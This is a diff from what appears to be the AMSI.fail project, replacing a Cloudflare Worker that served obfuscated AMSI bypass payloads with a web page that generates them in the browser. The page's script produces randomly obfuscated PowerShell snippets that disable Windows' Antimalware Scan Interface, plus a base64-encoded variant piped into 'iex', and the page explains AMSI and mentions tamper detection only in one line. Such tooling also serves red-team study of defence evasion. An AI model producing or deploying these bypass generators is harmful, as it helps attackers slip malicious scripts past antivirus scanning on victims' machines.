@@ -1,81 +1,19 @@
-addEventListener('fetch', function(event) {
-  const { request } = event
-  const response = handleRequest(request).catch(handleError)
-  event.respondWith(response)
-})
-
-/**
- * Receives a HTTP request and replies with a response.
- * @param {Request} request
- * @returns {Promise<Response>}
- */
-async function handleRequest(request) {
-  const { method, url } = request
-  const { host, pathname } = new URL(url)
-
-  switch (pathname) {
-    case '/api/Generate':
-      return respond(request)
-    case '/api/GenerateEnc':
-      return respondEnc(request)
-  }
-
-  // Workers on these hostnames have no origin server,
-  // therefore there is nothing else to be found
-  if (host.endsWith('.workers.dev')
-      || host.endsWith('.cloudflareworkers.com')) {
-    return new Response('Not Found', { status: 404 })
-  }
-
-  // Makes a fetch request to the origin server
-  return fetch(request)
-}
-
-/**
- * Responds with an uncaught error.
- * @param {Error} error
- * @returns {Response}
- */
-function handleError(error) {
-  console.error('Uncaught error:', error)
-
-  const { stack } = error
-  return new Response(stack || error, {
-    status: 500,
-    headers: {
-      'Content-Type': 'text/plain;charset=UTF-8'
+<html><head><meta charset="utf-8">
+	<title>AMSI.fail</title>
+	<link href="css/frame.css" media="screen" rel="stylesheet" type="text/css">
+	<link href="css/controls.css" media="screen" rel="stylesheet" type="text/css">
+	<link href="css/custom.css" media="screen" rel="stylesheet" type="text/css">
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700" rel="stylesheet" type="text/css">
+	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700" rel="stylesheet"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="js/menu.js"></script>
+	<style type="text/css">.menu-index {
+      color: rgb(255, 255, 255) !important;
+      opacity: 1 !important;
+      font-weight: 700 !important;
     }
-  })
-}
-
-/**
- * Responds with an obfuscated AMSI bypass.
- * @returns {Promise<Response>}
- */
-async function respond() {
-  return new Response(getPayload(), {
-    status: 200,
-    headers: {
-      'Content-Type': 'text/plain;charset=UTF-8',
-      'Cache-Control': 'no-store',
-    }
-  })
-}
-
-/**
- * Responds with an encoded and obfuscated AMSI bypass.
- * @returns {Promise<Response>}
- */
-async function respondEnc() {
-    payload = `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`   
-  return new Response(payload, {
-    status: 200,
-    headers: {
-      'Content-Type': 'text/plain;charset=UTF-8',
-      'Cache-Control': 'no-store',
-    }
-  })
-}
+	</style>
+	<script>
+  
 
 /**
  * Grabs a string, converts it from unicode into a base64 string
@@ -356,3 +294,81 @@ function getPayload(){
             return encodeRasta(RastaBuf)
     }
 }
+
+function GeneratePS(){
+   
+   document.getElementById("PowerShellOut").value =  getPayload();            
+}
+
+function GenerateEncPS(){
+   document.getElementById("PowerShellOut").value =  `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`           
+}
+
+
+</script>
+</head>
+<body data-gr-c-s-loaded="true" data-new-gr-c-s-loaded="8.872.0" data-new-gr-c-s-check-loaded="8.873.0" data-gr-ext-installed="">
+<div class="menu-container">
+<div class="menu">
+<div class="menu-table flex-row-space-between">
+<div class="logo flex-row-center"><a href="index.html">AMSI.fail</a><a class="menu-index" style="font-size: 80%; position: absolute; bottom: 0;"> ~Flangvik~ </a></div>
+<a class="menu-button" href="javascript:void(0)" tabindex="0"><img src="img/menu.png"> </a>
+
+<div class="menu-items flex-row-center flex-item"><a class="menu-index" href="index.html">AMSI</a> <a href="https://github.com/Flangvik/AMSI.fail">GitHub</a></div>
+</div>
+</div>
+</div>
+
+<div class="content-container">
+<div class="content">
+<div class="content-table flex-column"><!--------------------------------------------------------------------------------------------><!--------------------------------------------------------------------------------------------><!--Start Text Only-->
+<div class="flex-row">
+<div class="flex-item flex-column" data-children-count="1">
+<h2 class="add-top-margin">What is AMSI.fail?</h2>
+
+<hr>
+<p class="text">AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.<br data-children-count="0">
+&nbsp;</p>
+<textarea cols="50" id="PowerShellOut" rows="10"></textarea><br>
+<button class="custom-button custom-button-primary" onclick="GeneratePS()">Generate</button>
+<p> </p>
+<button class="custom-button custom-button-primary" onclick="GenerateEncPS()">Generate Encoded</button>
+<h2 class="add-top-margin">What is AMSI?</h2>
+
+<hr>
+<p class="text">As f-secure explained in one of their excellent <a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/">blog-posts</a>:<br>
+<br>
+AMSI is an interface on which applications or services (third-party included) are able to scan a script’s content for malicious usage. If a signature in the script is registered by the AMSI antimalware service provider (Windows Defender by default), it will be blocked.<br>
+To put this into context, consider the following steps PowerShell takes to integrate with AMSI:</p>
+
+<ul>
+	<li>When a PowerShell process is created, AMSI.DLL is loaded from disk into its address space.</li>
+	<li>Within AMSI.DLL, there’s a function known as AmsiScanBuffer(), essentially the function used to scan a script’s content.</li>
+	<li>In the PowerShell command prompt, any supplied content would first be sent to AmsiScanBuffer(), before any execution takes place.</li>
+	<li>Subsequently, AmsiScanBuffer() would check with the registered anti-virus to determine if any signatures have been created.</li>
+	<li>If the content is deemed malicious, it would be blocked.</li>
+</ul>
+
+<p class="text">Since AMSI relies on being loaded within the process executing the actual script, techniques to break or patch specific functions within amsi.dll are well known.</p>
+
+<h2 class="add-top-margin">Detection</h2>
+
+<hr>
+<p class="text">All the demonstrated techniques rely on tampering with the amsi.dll library within the operating process, generic tamper-detection is key.</p>
+
+<h2 class="add-top-margin">Credits</h2>
+
+<hr>
+<ul>
+	<li><a href="https://github.com/yenchiah/project-website-template">https://github.com/yenchiah/project-website-template</a></li>
+	<li><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></li>
+	<li><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a></li>
+	<li><a href="https://twitter.com/mattifestation/status/735261120487772160">https://twitter.com/mattifestation/status/735261120487772160</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+</body></html>
